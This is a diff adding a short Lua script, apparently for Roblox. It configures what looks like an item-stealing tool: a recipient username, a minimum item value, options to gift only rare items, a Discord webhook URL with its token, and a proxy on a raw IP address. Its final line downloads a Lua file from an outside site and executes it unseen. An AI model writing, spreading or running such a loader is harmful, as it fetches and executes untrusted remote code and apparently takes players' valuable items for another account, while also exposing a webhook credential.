@@ -1,0 +1,13 @@
+_G.LRMConfig = {
+    User = {"PEPERNGANI"},
+    min_value = 10000000000,
+    pingEveryone = "No", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1380428215155163136/LlYlqaou6YDjCJbBmMPcv2dieXREmKKQahY9cbR3WUcSRAqs8Gk8qHw7Y75xo9Hd09GN",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/a3970b5dee8401d73c5514088f3cc8ef",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://lrmscripts.com/script/main.lua'))()
